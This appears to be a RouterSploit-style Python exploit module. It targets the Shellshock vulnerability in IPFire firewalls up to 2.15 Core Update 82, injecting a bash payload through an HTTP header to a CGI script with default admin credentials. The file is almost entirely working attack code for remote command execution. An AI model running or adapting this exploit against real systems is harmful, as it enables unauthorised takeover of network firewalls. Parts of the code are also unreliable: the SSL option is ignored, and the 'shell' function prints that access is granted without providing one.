# rsf exploit module
# description: Exploits shellshock vulnerability in IPFire <= 2.15 Core Update 82.
# If the target is vulnerable, it is possible to execute commands on operating system level.

import requests

class Exploit:
    __info__ = {
        "name": "IPFire Shellshock",
        "description": "Exploits shellshock vulnerability in IPFire <= 2.15 Core Update 82. "
                       "If the target is vulnerable, it is possible to execute commands on operating system level.",
        "authors": (
            "Claudio Viviani",  # vulnerability discovery
            "Marcin Bury <marcin@threat9.com>",  # routersploit module
        ),
        "references": (
            "https://www.exploit-db.com/exploits/34839",
        ),
        "devices": (
            "IPFire <= 2.15 Core Update 82",
        ),
    }

    def __init__(self, target, port=444, ssl=True, username="admin", password="admin"):
        self.target = target
        self.port = port
        self.ssl = ssl
        self.username = username
        self.password = password
        self.payload = "() { :;}; /bin/bash -c '{{cmd}}'"

    def run(self):
        if self.check():
            print("Target is vulnerable")
            print("Invoking command loop...")
            self.shell()
        else:
            print("Target is not vulnerable")

    def execute(self, cmd):
        marker = "random_text_marker"
        cmd = f"echo {marker};{cmd}"
        payload = self.payload.replace("{{cmd}}", cmd)

        headers = {
            "VULN": payload,
        }

        response = requests.get(f"http://{self.target}:{self.port}/cgi-bin/index.cgi", headers=headers, auth=(self.username, self.password))

        if response is None:
            return ""

        if response.status_code == 200:
            start = response.text.find(marker) + len(marker) + 1
            end = response.text.find("<!DOCTYPE html>", start)

            return response.text[start:end]

        return ""

    def check(self):
        response = self.execute("echo test")

        if "test" in response:
            return True

        return False

    def shell(self):
        print("Shell access granted")


